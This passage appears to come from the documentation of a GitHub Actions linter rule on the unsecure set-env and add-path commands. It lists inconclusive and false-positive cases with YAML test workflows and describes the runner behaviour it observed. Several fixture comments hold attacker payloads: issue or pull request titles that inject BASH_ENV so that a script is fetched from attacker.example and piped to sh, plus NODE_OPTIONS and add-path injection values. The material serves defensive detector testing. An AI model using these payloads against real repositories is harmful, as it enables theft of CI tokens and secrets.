- call-body-unknown: a call of a function after the rule has read the bodies of the functions at 4,096 calls in the script, such as a call after a chain of functions in which each function calls the next function twice (f1() { f0; f0; }; ... f13() { f12; f12; }; f13; w): the rule does not read the bodies of the functions at the calls past the 4,096 calls, so the rule does not decide the assignments, the writes, the prints and the requests in the bodies of the functions at the calls past the 4,096 calls
  - disposition: todo (needs: same-file)
  - example: call-body-unknown.yml (workflow, inconclusive)
    ```yaml
    # situation: on issues, a job sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true
    #   in its env; a step passes the title of the issue in the environment
    #   variable T, defines a function w that sets T to a fixed word when
    #   SAFE_MODE is set (the step does not set SAFE_MODE),
    #   runs a chain of functions f0 to f13 in which each function calls the
    #   function before it twice (16,383 calls), calls w, and prints T; a step
    #   comes after.
    # reason: the call of w comes after the 4,096 calls of functions that the
    #   rule follows, so the rule does not read the body of w, and does not
    #   decide whether T holds the title of the issue when echo runs.
    # attack: the attacker opens an issue titled ##[set-env
    #   name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
    # attack-run-behavior: w sets nothing, the step prints the title, the
    #   runner sets BASH_ENV, and the bash of the next step runs the attacker's
    #   script with the token and the secrets of the job.
    on: issues
    permissions: {}
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - env:
              T: ${{ github.event.issue.title }}
            run: |
              w() { if [ -n "$SAFE_MODE" ]; then T=safe; fi; }
              f0() { :; }
              f1() { f0; f0; }
              f2() { f1; f1; }
              f3() { f2; f2; }
              f4() { f3; f3; }
              f5() { f4; f4; }
              f6() { f5; f5; }
              f7() { f6; f6; }
              f8() { f7; f7; }
              f9() { f8; f8; }
              f10() { f9; f9; }
              f11() { f10; f10; }
              f12() { f11; f11; }
              f13() { f12; f12; }
              f13
              w
              echo "issue: $T"
          - run: echo next
    ```
- remote-callee-unknown: a job that calls a reusable workflow of another repository, when the linter asked the fact workflow.definition for the reusable workflow and got no answer (the token that the linter uses cannot read the file, the file is larger than the limit, or the linter has used up the requests it may send to the GitHub API), or when the call is deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact: the rule does not read the jobs and the steps of the reusable workflow
  - disposition: todo (needs: fact)
  - example: remote-callee-unknown.yml (workflow, inconclusive)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/unsecure-commands-unknown, whose content is
    #   the workflow of the true positive controlled
    #   (controlled.custom-shell-xtrace.yml) of the rule, with on: workflow_call
    #   in place of the on of controlled.custom-shell-xtrace.yml. The linter
    #   asked the fact workflow.definition for the reusable workflow and got no
    #   answer.
    # reason: what the jobs of the reusable workflow do is in the file that the
    #   linter could not read; whoever changes the uses, such as the author of a
    #   pull request, can name a reusable workflow that the token that the
    #   linter uses cannot read.
    # attack: the attacker opens an issue titled ##[set-env
    #   name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
    # attack-run-behavior: the trace prints the git log command with the title,
    #   the runner sets BASH_ENV, and the bash of the next step runs the
    #   attacker's script with the token and the secrets of the job.
    on: issues
    permissions: {}
    jobs:
      c:
        uses: example-org/unsecure-commands-unknown/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### false positive forms

- lastpipe-not-literal: a variable of the env of the step that the script sets again in the last command of a pipeline after a shopt -s lastpipe whose option name the script does not write as a literal word (shopt -s "\$o"): bash runs the last command of the pipeline in the shell that runs the pipeline, so after the pipeline the variable holds the value that the script sets, and the rule reads the variable as holding the value of the env
  - finding kinds: unsecure-commands.controlled
  - disposition: todo (needs: same-file)
  - example: lastpipe-not-literal.yml (workflow, false-positive)
    ```yaml
    # situation: on issues, a job sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true
    #   in its env; a step passes the title of the issue in the environment
    #   variable T, turns lastpipe on with shopt -s and the option name in a
    #   variable, sets T to a fixed word with read in the last command of a
    #   pipeline, and prints T; a step comes after.
    # reason: with lastpipe, bash runs the last command of the pipeline in the
    #   shell that runs the pipeline, so T holds the fixed word when echo runs,
    #   and the step does not print the title.
    # cause: the rule follows lastpipe only after shopt -s lastpipe written as
    #   literal words, so the rule reads T as holding the value of the env.
    # attack: the attacker titles the issue ##[set-env name=BASH_ENV;]$(id).
    # attack-run-behavior: the step prints "issue: safe"; nothing is set.
    on: issues
    permissions: {}
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - env:
              T: ${{ github.event.issue.title }}
            run: |
              o=lastpipe
              shopt -s "$o"
              echo safe | read -r T
              echo "issue: $T"
          - run: echo next
    ```
- name-not-literal: a variable of the env of the step that the script sets again by an assignment whose variable name the script does not write as a literal word (n=TITLE; declare "\$n=echo safe"): bash assigns the word after = to the variable whose name is the value of n, so after the assignment the variable of the env holds the word that the script assigns, and the rule still reads the variable as holding the value of the env of the step
  - finding kinds: unsecure-commands.controlled
  - disposition: todo (needs: same-file)
  - example: name-not-literal.yml (workflow, false-positive)
    ```yaml
    # situation: on issues, a job sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true
    #   in its env; a step passes the title of the issue in the environment
    #   variable T, sets n to the name T, assigns a fixed word to the variable
    #   that n names with declare, and prints T; a step comes after.
    # reason: bash assigns the fixed word to T, so T holds the fixed word when
    #   echo runs, and the step does not print the title.
    # cause: the variable name of the assignment is not a literal word, so the
    #   rule reads T as holding the value of the env.
    # attack: the attacker titles the issue ##[set-env name=BASH_ENV;]$(id).
    # attack-run-behavior: the step prints "issue: safe"; nothing is set.
    on: issues
    permissions: {}
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - env:
              T: ${{ github.event.issue.title }}
            run: |
              n=T
              declare "$n=safe"
              echo "issue: $T"
          - run: echo next
    ```
- fork-flag-review: a job on pull_request_review or pull_request_review_comment whose if: condition lets the job run only when the head repository of the pull request is a fork, such as a job whose if: condition is github.event.pull_request.head.repo.fork: on a pull request from a branch of the repository, the head repository is the repository itself, so in a repository that is not a fork the job runs only for a review of a pull request from a fork. The run of a review of a pull request from a fork has the secrets of the repository or a token that writes only where a private repository gives secrets or a token that writes to the runs of pull requests from forks (the undetected form fork-review). The rule does not read whether the repository that runs the workflow (not the head repository of the pull request) is a fork, and reports the job as if the job ran for a review of a pull request from a branch of the repository
  - finding kinds: unsecure-commands.controlled, unsecure-commands.wiki
  - disposition: todo (needs: fact)
  - example: fork-flag-review.yml (workflow, false-positive)
    ```yaml
    # situation: on comments on the diff, a step with
    #   ACTIONS_ALLOW_UNSECURE_COMMANDS prints the comment's body, in a job
    #   that runs only when the head repository of the pull request is a fork.
    # reason: the job runs only when the head repository of the pull request
    #   is a fork. On a pull request from a branch of the repository, the head
    #   repository is the repository itself, so in a repository that is not a
    #   fork the job runs only for a review of a pull request from a fork. In
    #   a public repository, the run of such a review has no secrets and a
    #   token that only reads; in a private repository, the run has neither
    #   secrets nor a token that writes unless the repository gives secrets or
    #   a token that writes to the runs of pull requests from forks (the
    #   undetected form fork-review).
    # cause: the rule does not read whether the repository that runs the
    #   workflow (not the head repository of the pull request) is a fork, and
    #   reads the job as if the job ran for a review of a pull request from a
    #   branch of the repository.
    # attack-value: github.event.comment.body = "::set-env name=NODE_OPTIONS::--require=/tmp/PWNED.js"
    # attack-run-behavior: in a public repository that is not a fork, a review
    #   of a pull request from a branch of the repository does not start the
    #   job, as the head repository of such a pull request is the repository
    #   itself; a review of a pull request from a fork starts the job with no
    #   secrets and a token that only reads, so the value reaches no secret
    #   and no token that writes.
    on: pull_request_review_comment
    jobs:
      a:
        if: github.event.pull_request.head.repo.fork
        runs-on: ubuntu-latest
        steps:
          - env:
              ACTIONS_ALLOW_UNSECURE_COMMANDS: true
              B: ${{ github.event.comment.body }}
            run: echo "c=$B"
          - run: echo next
    ```
- writer-string: a string only those who can write to the repository, or moderate or administer its organization, set, which the webhook schema leaves free and the table reads as arbitrary, such as the name of a label (https://docs.github.com/en/issues/using-labels-and-milestones-to-track-work/managing-labels), the reason a comment is hidden (https://docs.github.com/en/communities/moderating-comments-and-conversations/managing-disruptive-comments), the name of an issue field or of its option (https://docs.github.com/en/issues/tracking-your-work-with-issues/using-issues/managing-issue-fields-in-your-organization)
  - finding kinds: unsecure-commands.controlled, unsecure-commands.wiki
  - disposition: todo (needs: same-file)
  - example: writer-string.yml (workflow, false-positive)
    ```yaml
    # situation: on issues, a job sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true,
    #   and a step prints the name of the label of the event.
    # reason: only those who can write to the repository name a label, so no
    #   outside attacker writes the printed value.
    # cause: the webhook schema leaves the name free, and the table reads it as
    #   arbitrary.
    # attack: an outside attacker cannot name a label.
    # attack-run-behavior: the step prints the name of the label; nothing an
    #   outsider wrote is read.
    on: issues
    permissions: {}
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - run: echo "${{ github.event.label.name }}"
          - run: echo next
    ```
- if-unnarrowed: a value that an if compares with strings that the workflow writes in the if (strings compared by == with the value and joined by ||, or the strings of contains(fromJSON('&#91;...]'), value)), where each string has only ASCII letters, digits, spaces, -, \_, . and /, does not start with -, and has no - right after a space, where the rule reports the value although the if limits the value to those strings, because the rule does not read the if in one of three forms. (1) A reusable workflow or a composite action gets the value through an input, and the if of the calling job or the calling step compares the value. The rule reports the value in the file of the reusable workflow or the composite action. The value is harmless when the if of every caller of that file, inside and outside the repository, compares the value. (2) The if compares the value under one name, and the script writes the value under another name: for example, the if compares env.BODY, which the env of the step sets to \${{ github.event.comment.body }}, and the script writes \${{ github.event.comment.body }}; or the if compares \${{ github.head_ref }}, and the script writes \${{ github.event.pull_request.head.ref }}. The value is harmless when the two names hold the same value in the step; the rule does not check that the two names hold the same value. (3) The if of a step that uses an action compares a value that the with or the env of the same step holds. At the start of the job, the runner runs the pre step of each action from another repository whose action.yml has runs.pre, under the condition runs.pre-if of that action.yml and not under the if of the step. For the pre step, the runner evaluates the with and the env of the step, and the code of the pre step may read the inputs. The runner runs no pre step of a local action (./). The value is harmless when the action has no pre step, or when the code of the pre step does not read the value. In each form, the value is harmless only where the case of the letters does not change what the value names (the undetected form if-compared)
  - finding kinds: unsecure-commands.controlled, unsecure-commands.wiki
  - disposition: todo (needs: same-file)
  - example: if-unnarrowed.yml (workflow, false-positive)
    ```yaml
    # situation: on issue_comment created, a step that has the comment's body in
    #   env.BODY runs only when env.BODY is deploy, and the step
    #   prints ${{ github.event.comment.body }}; the job sets
    #   ACTIONS_ALLOW_UNSECURE_COMMANDS to true, and another step of the job
    #   runs after the step, as the rule requires.
    # reason: the step's if compares env.BODY, which holds the comment's body,
    #   with deploy, so in the step the body is deploy, ignoring the case of its
    #   letters: the body has no character that the shell reads as code, no
    #   line break, no word that starts with - and no workflow command.
    # cause: the rule limits a value by an if only under the name that the if
    #   compares: the if compares env.BODY, and the script writes
    #   ${{ github.event.comment.body }}; the rule does not check that env.BODY
    #   holds the comment's body.
    # attack-value: github.event.comment.body = "##[set-env name=BASH_ENV;]./x.sh"
    # attack-run-behavior: on GitHub, the step's if is false for such a body,
    #   and the runner skips the step.
    on:
      issue_comment:
        types: [created]
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - if: env.BODY == 'deploy'
            env:
              BODY: ${{ github.event.comment.body }}
            run: echo "${{ github.event.comment.body }}"
          - run: echo next
    ```
- stopped-commands: a value printed between ::stop-commands::TOKEN and ::TOKEN::, where TOKEN is a value the step chooses at random for each run, and the runner reads no command
  - finding kinds: unsecure-commands.controlled, unsecure-commands.wiki
  - disposition: todo (needs: same-file)
  - example: stopped-commands.yml (workflow, false-positive)
    ```yaml
    # situation: on issues, a job sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true,
    #   and a step prints the title of the issue between ::stop-commands:: and
    #   its token.
    # reason: the runner reads no command between ::stop-commands:: and its
    #   token, so the title sets nothing.
    # cause: the rule does not read stop-commands.
    # attack: the attacker titles the issue ##[set-env name=BASH_ENV;]$(id).
    # attack-run-behavior: the step prints the title as it is; nothing is set.
    on: issues
    permissions: {}
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - env:
              TITLE: ${{ github.event.issue.title }}
            run: |
              echo "::stop-commands::stop-6a1f2c"
              echo "$TITLE"
              echo "::stop-6a1f2c::"
          - run: echo next
    ```
- callee: a reusable workflow or a composite action when all of the following are true: the rule does not know all of the callers of the reusable workflow or the composite action; every workflow that runs the reusable workflow or the composite action (directly, or through another reusable workflow or composite action) is a workflow in the same repository; and the rule would report no finding of the finding kind if the rule read the reusable workflow or the composite action only on the events on which the workflows in the same repository run the reusable workflow or the composite action (for example, every workflow that runs the reusable workflow or the composite action runs only on push). When the rule does not know all of the callers, the rule can read the reusable workflow or the composite action on every event (the worst case). For example, the rule does not know all of the callers when no caller is among the inputs; when the inputs are not the whole repository; for a composite action, when an input is excluded or cannot be read; when a caller names the reusable workflow or the composite action by a name of the form owner/repo/path@ref instead of by a ./ path, in which owner/repo is the repository that the --repo flag names, or is any repository when no --repo flag is given; when a step names the composite action by a ./ path, and either no checkout step runs before that step or the last checkout step before that step is not a plain checkout step (a plain checkout step has no ref input, no repository input and no path input); when a step inside a composite action names another composite action by a ./ path; or when the rule does not know all of the callers of a caller
  - finding kinds: unsecure-commands.controlled, unsecure-commands.wiki
  - disposition: todo (needs: repo-file)
  - example: callee.yml (workflow, false-positive)
    ```yaml
    # situation: a reusable workflow that sets ACTIONS_ALLOW_UNSECURE_COMMANDS
    #   to true and prints the title of an issue, and that only the
    #   repository's own workflows call, all of them on push.
    # reason: the issue the workflow reads is never an outsider's.
    # cause: a callee is read in the worst case, as if a caller ran on issues.
    # attack: an outsider cannot start a caller on issues.
    # attack-run-behavior: called on push, the event has no issue, so the step
    #   prints an empty line and nothing is set.
    on: workflow_call
    permissions: {}
    jobs:
      a:
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - env:
              V: ${{ github.event.issue.title }}
            run: echo "$V"
          - run: echo next
    ```
  - example: .github/workflows/called.yml (workflow, false-positive)
    ```yaml
    # situation: ci.yml of the repository o/r calls this reusable workflow on
    #   push only, by the name o/r/.github/workflows/called.yml@main, not by the
    #   path ./.github/workflows/called.yml.
    # reason: when the run of the linter names the repository (--repo o/r), the
    #   call by the name is a call of this file, and the only caller runs on
    #   push, which no attacker of the finding kind triggers. A run without
    #   --repo reads the call by the name o/r/.github/workflows/called.yml@main
    #   as a call that may name a file of the repository, because the run does
    #   not know which repository the inputs are; the rule does not resolve the
    #   call to this file, so the rule reads this file on every event and reports
    #   the same finding.
    # cause: the rule does not resolve a call by the name of the repository to
    #   the file, so the rule reads this workflow on every event.
    # attack: the attacker opens an issue, a pull request or a comment with a
    #   value that would reach this workflow on an event of the attacker.
    # attack-run-behavior: only a push to the repository runs ci.yml, which
    #   calls this workflow on push; the run of the push reads no value of the
    #   attacker's issue, pull request or comment.
    on:
      workflow_call:
    permissions: {}
    jobs:
      a:
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - env:
              BODY: ${{ github.event.issue.body }}
            run: echo "$BODY"
          - run: echo next
    ```
    - finding on: .github/workflows/called.yml
    - .github/workflows/ci.yml (workflow)
      ```yaml
      on: push
      jobs:
        call:
          uses: o/r/.github/workflows/called.yml@main
          secrets: inherit
      ```
- pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
  - finding kinds: unsecure-commands.controlled
  - fact kinds:
    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
  - example: pull-request-target-blocked.yml (workflow, false-positive)
    ```yaml
    # situation: on pull_request_target, a job sets
    #   ACTIONS_ALLOW_UNSECURE_COMMANDS to true in its env, and a step prints the
    #   title of the pull request; a step comes after.
    # reason: the Actions policies of the repository block the runs of the
    #   workflow on pull_request_target: the default policy that GitHub adds to a
    #   public repository without an applicable event policy, from the time when
    #   GitHub enforces the default policy on the repository, or an event policy
    #   whose list of allowed events does not have pull_request_target. GitHub's
    #   documents say that GitHub evaluates the policies before a run, and that a
    #   run that a policy does not allow fails with an error; the documents do not
    #   say whether a job of such a run starts before the run fails, and the rule
    #   assumes that no job starts.
    # cause: unless a file of facts or --fact says that the Actions policies block
    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
    #   rule reports the finding. When no file of facts and no --fact answers
    #   repo.pull-request-target-allowed, the finding is conditional.
    # attack: the author of a pull request from a fork titles the pull request
    #   ##[set-env name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
    # attack-run-behavior: the pull request of the attacker triggers
    #   pull_request_target, and the run fails with an error, and no job of the
    #   run starts (the assumption of the reason), so the title is never printed.
    on: pull_request_target
    permissions: {}
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - env:
              TITLE: ${{ github.event.pull_request.title }}
            run: |
              echo "pull request: $TITLE"
          - run: echo next
    ```
- actions-policy: a run that the Actions policies of the repository block, in four cases where the rule does not take the policies into account. First, an event policy that blocks an event of the attackers other than pull_request_target (such as issue_comment) in a workflow whose on has that event: the rules ask a fact only for pull_request_target. Second, an actor rule that does not allow the account of the attacker (for example, an actor rule that allows only the repository roles with write access): repo.pull-request-target-allowed is one value for all the runs of a workflow file on pull_request_target, and an actor rule blocks a run by the account that starts the run, so the fact cannot tell what an actor rule blocks. Third, a workflow whose on has pull_request_target and another event: the rule does not ask repo.pull-request-target-allowed for such a workflow, because a run on the other event can reach the job. When the if of the job is false on the other event, so that the job runs only on pull_request_target, and a policy blocks pull_request_target, the finding is a false positive. Fourth, a reusable workflow (on workflow_call) or an action that only workflows on pull_request_target call: the rule asks repo.pull-request-target-allowed only of a workflow whose on has pull_request_target, not of the reusable workflow or the action, so a finding in the reusable workflow or the action is still reported when the policies block the runs of every caller
  - finding kinds: unsecure-commands.controlled
  - disposition: todo (needs: fact)
  - example: actions-policy.yml (workflow, false-positive)
    ```yaml
    # situation: on pull_request_target, a job sets
    #   ACTIONS_ALLOW_UNSECURE_COMMANDS to true in its env, and a step prints the
    #   title of the pull request; a step comes after.
    # reason: an actor rule of the Actions policies of the repository allows
    #   only the repository roles with write access to trigger the workflow, so a
    #   run that a pull request from an account without write access triggers
    #   fails. GitHub's documents say that GitHub evaluates the policies before a
    #   run, and that a run that a policy does not allow fails with an error; the
    #   documents do not say whether a job of such a run starts before the run
    #   fails, and the rule assumes that no job starts.
    # cause: the rule does not take the actor rules of the Actions policies into
    #   account: repo.pull-request-target-allowed is one value for all the runs of
    #   the workflow file on pull_request_target, and an actor rule blocks a run
    #   by the account that starts the run.
    # attack: the author of a pull request from a fork titles the pull request
    #   ##[set-env name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
    # attack-run-behavior: the account of the attacker is not an allowed actor,
    #   so the run on pull_request_target fails with an error, and no job of the
    #   run starts (the assumption of the reason), so the title is never printed.
    name: policy
    on: pull_request_target
    permissions: {}
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - env:
              TITLE: ${{ github.event.pull_request.title }}
            run: |
              echo "pull request: $TITLE"
          - run: echo next
    ```
- app-checks-unasked: a run of status, check_suite or check_run in a repository where no app outside GitHub Actions makes a commit status or a check run for a commit that the attacker of the finding writes: the facts that the finding kind asks are false (repo.fork-pr-app-checks for a commit of a pull request from a fork, repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository). In two cases, the rule does not ask these facts, and reports the finding whatever the values of the facts are. First, a workflow whose on has an event other than status, check_suite and check_run: the rule decides whether to ask the facts from the events of on alone, and does not read the if of the job, so the rule does not ask the facts even when the if of the job lets the job run only on status, check_suite or check_run. Second, a reusable workflow (on workflow_call) or an action (an action has no on) that only workflows on status, check_suite or check_run call: the rule asks the facts only of a workflow whose on has only events among these three, not of the reusable workflow or the action, so the rule reports a finding in the reusable workflow or the action whatever the values of the facts are
  - finding kinds: unsecure-commands.controlled
  - disposition: todo (needs: same-file, repo-file)
  - example: app-checks-unasked.yml (workflow, false-positive)
    ```yaml
    # situation: on status and push, the job runs only on status (its if), and
    #   writes the message of the commit of the status
    #   (github.event.commit.commit.message) where the rule reads it.
    # reason: no app outside GitHub Actions makes a commit status or a check run
    #   for a commit whose message an attacker writes in the repository: no app
    #   makes one for a commit of a pull request from a fork
    #   (repo.fork-pr-app-checks false), and no app makes one for a commit that
    #   the merge of a pull request puts in a branch
    #   (repo.merge-commit-app-checks false), so no run of status has such a
    #   commit, and the job does not run on push.
    # cause: the rule asks repo.fork-pr-app-checks and
    #   repo.merge-commit-app-checks only of a workflow whose on has no event
    #   other than status, check_suite and check_run, and the on of this
    #   workflow has push.
    # attack-value: github.event.commit.commit.message = "::set-env name=BASH_ENV::/tmp/x.sh"
    # attack-run-behavior: the author of a pull request from a fork writes the
    #   value in the message of a commit; no app makes a status for the commit,
    #   so no run of status starts with the value, and a push by one who can
    #   write runs no job.
    on: [status, push]
    permissions: {}
    jobs:
      j:
        if: github.event_name == 'status'
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - run: echo "${{ github.event.commit.commit.message }}"
          - run: echo next
    ```
- actions-not-allowed: a workflow whose run GitHub does not start, or a job that GitHub fails in the step "Set up job", because of the setting of allowed actions of GitHub (the fact repo.allowed-actions, which the quality rule allowed-actions reads): GitHub does not start a run of a workflow that has a uses, or that calls a reusable workflow that has a uses, that the setting does not allow, and fails a job before any step of the job runs when a step of a composite action that the job runs has a uses that the setting does not allow, or when the setting requires a full commit SHA and a step names an action by a tag or a branch. The harm that the finding reports happens only when GitHub runs the workflow or the job, and the rule does not read repo.allowed-actions
  - finding kinds: unsecure-commands.controlled, unsecure-commands.wiki
  - disposition: todo (needs: fact)
  - example: actions-not-allowed.yml (workflow, false-positive)
    ```yaml
    # situation: the workflow of the true positive controlled (controlled.yml)
    #   of the rule, with a job added whose step uses
    #   example-org/not-allowed-action, which the setting of allowed actions of
    #   GitHub (repo.allowed-actions) blocks with
    #   !example-org/not-allowed-action@*. In the true positive, on issues, a
    #   job sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true in its env, and a step
    #   prints the title of the issue; a step comes after.
    # reason: GitHub checks each uses of the workflow before the run starts, and
    #   does not start the run because of the uses of
    #   example-org/not-allowed-action: no job of the run runs, so what the
    #   reason of the true positive says does not happen (in runs that the
    #   authors of the rule made on GitHub, such runs ended as startup_failure).
    # cause: the rule does not read repo.allowed-actions.
    # attack: the attacker opens an issue titled ##[set-env
    #   name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
    # attack-run-behavior: GitHub does not start the run, so no step of the run
    #   runs, and the attack does nothing.
    on: issues
    permissions: {}
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - env:
              TITLE: ${{ github.event.issue.title }}
            run: |
              echo "issue: $TITLE"
          - run: echo next
      not-allowed:
        runs-on: ubuntu-latest
        steps:
          - uses: example-org/not-allowed-action@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```
- fork-pull-request: a job that runs only for a pull request from a fork (pull_request, pull_request_review or pull_request_review_comment, with an if that compares github.event.pull_request.head.repo.fork with true, or github.event.pull_request.head.repo.full_name with github.repository), in a repository that is not a fork, in a run of the linter that adds variables-writer or secrets-writer: the rule reads each value of vars and secrets as a value that the attacker writes in every workflow run of the event; the workflow run for a pull request from a fork has no secret except GITHUB_TOKEN and a GITHUB_TOKEN that only reads, unless the settings of a private repository send secrets or a GITHUB_TOKEN that writes to such workflow runs (the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens), and the attacker who writes a variable or a secret gets nothing from the job that the author of the pull request does not get from the code of the pull request. A job with no such if, in a repository where every pull request comes from a fork, is a false positive in the same way. The linter does not tell a workflow run for a pull request from a fork from a workflow run for a pull request from a branch of the repository. A fix: the linter splits the workflow runs of the three events into the runs for a pull request from a fork and the runs for a pull request from a branch of the repository, reads the comparisons of the if with the fork in each, and counts a run for a pull request from a fork only when the facts repo.fork-pr-secrets or repo.fork-pr-write-tokens say that the run gets secrets or a GITHUB_TOKEN that writes. A job with no such if keeps the runs for a pull request from a branch of the repository, and the finding stays. A fact of the rulesets of the repository (a ruleset with the rule Restrict creations on every branch and no actor that may bypass the ruleset) could say that no new branch, and so no pull request from a new branch, can be made, and remove a part of the false positives of a job with no such if; the actors that may bypass a ruleset, the branches made before the ruleset and the names of branches outside the patterns of the ruleset remain. The fix is not observed on GitHub
  - finding kinds: unsecure-commands.controlled, unsecure-commands.wiki
  - disposition: todo (needs: same-file, fact)
  - added attackers: variables-writer, secrets-writer
  - example: fork-pull-request.yml (workflow, false-positive)
    ```yaml
    # situation: on pull_request, a job that runs only when the head repository
    #   of the pull request is a fork writes values of vars and secrets where
    #   the rule reads a value that the attacker writes.
    # reason: in a run of the linter that adds variables-writer or
    #   secrets-writer, the rule reads each value of vars and secrets as a
    #   value that the attacker writes. In a repository that is not a fork,
    #   the job runs only for a pull request from a fork, and such a workflow
    #   run has no secret except GITHUB_TOKEN and a GITHUB_TOKEN that only
    #   reads, unless the settings of a private repository send secrets or a
    #   GITHUB_TOKEN that writes to the workflow runs for pull requests from
    #   forks (the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens).
    #   The attacker who writes a variable or a secret gets nothing from the
    #   job that the author of the pull request does not get from the code of
    #   the pull request.
    # cause: the rule counts every workflow run of the event pull_request, and
    #   does not tell a workflow run for a pull request from a fork from a
    #   workflow run for a pull request from a branch of the repository.
    # attack-value: vars.RELEASE_TAG = "::add-path::/tmp/PWNED"
    # attack-run-behavior: a pull request from a branch of the repository does
    #   not start the job, as the head repository of such a pull request is the
    #   repository itself; a pull request from a fork starts the job with no
    #   secret and a GITHUB_TOKEN that only reads, so the value reaches no
    #   secret and no token that writes.
    on: pull_request
    permissions: {}
    jobs:
      j:
        if: github.event.pull_request.head.repo.fork
        runs-on: ubuntu-latest
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        steps:
          - env:
              TAG: ${{ vars.RELEASE_TAG }}
              NOTE: ${{ secrets.RELEASE_NOTE }}
            run: |
              echo "tag: $TAG"
              echo "note: $NOTE"
              echo "${{ runner.os }}"
          - run: echo next
    ```

### threat

- precondition unsecure-flag: where the env context of a step has ACTIONS_ALLOW_UNSECURE_COMMANDS that bool.TryParse reads as true (true in upper, lower or mixed letters, with blanks around it or not), from the env of the workflow, the job or the step or from \$GITHUB_ENV of a step before, the runner reads each line of the standard output and error of the step as a command: ::set-env and ::add-path:: at the head of the line after blanks, ##&#91;set-env name=NAME;] and ##&#91;add-path] anywhere in the line; set-env refuses NODE_OPTIONS alone, and the value sets the env of the steps after; ::stop-commands::TOKEN stops the reading up to ::TOKEN::, where TOKEN is a value the step chooses
  - observed: 2026-10-20, runner 2.337.0: with the flag true in the env of the job, lines that printed ::set-env after blanks, ##&#91;set-env name=NAME;] and ##&#91;add-path] after other text, ::set-env on the standard error, ::SET-ENV, and ::set-env after a line break of a value set the env and the PATH of the next step; ::set-env name=BASH_ENV::\$( ... ) made the next step run the command; NODE_OPTIONS was refused, and a line between ::stop-commands::TOKEN and ::TOKEN:: was not read. The flag TRUE and " true " turned the reading on, 1 did not; the flag in one step's env did so for that step alone, and the flag written to \$GITHUB_ENV did so for the steps after. The email of a commit's author and committer, holding ##&#91;set-env name=NAME;], set the env of the next step from github.event.head_commit
  - cites:
    - <https://github.com/actions/runner/blob/397b032cbf865e9c3ddfab89d533ec19325e1273/src/Runner.Common/ActionCommand.cs>
    - <https://github.com/actions/runner/blob/397b032cbf865e9c3ddfab89d533ec19325e1273/src/Runner.Worker/ActionCommandManager.cs>
    - <https://github.com/actions/runner/blob/397b032cbf865e9c3ddfab89d533ec19325e1273/src/Runner.Worker/Handlers/OutputManager.cs>
    - <https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/>
    - <https://github.com/advisories/GHSA-mfwh-5m23-j46w>
- precondition bash-env: a variable set in \$GITHUB_ENV is in the environment of the steps after it, NODE_OPTIONS alone refused; BASH_ENV there makes the bash of each run after it expand the value, \$( ) included, before the script
  - observed: 2026-09-27, runner 2.337.0: BASH_ENV=\$( ... ) after a line break of a value written to \$GITHUB_ENV ran its command in the bash of the next step
  - cites:
    - <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands#multiline-strings>
    - <https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html>
- precondition path-lookup: the steps after it look up in that PATH the commands their scripts call by name, and the runner looks up in that PATH the shell a run step names (bash, sh); not the node of a JavaScript action, which is the runner's own. The post steps of the actions that the steps before the step that writes to \$GITHUB_PATH use run after that step with that PATH too, and so do the hooks that a self-hosted runner runs after the job (a job completed hook, the hooks of a container); the runner looks up the shell of such a hook in that PATH
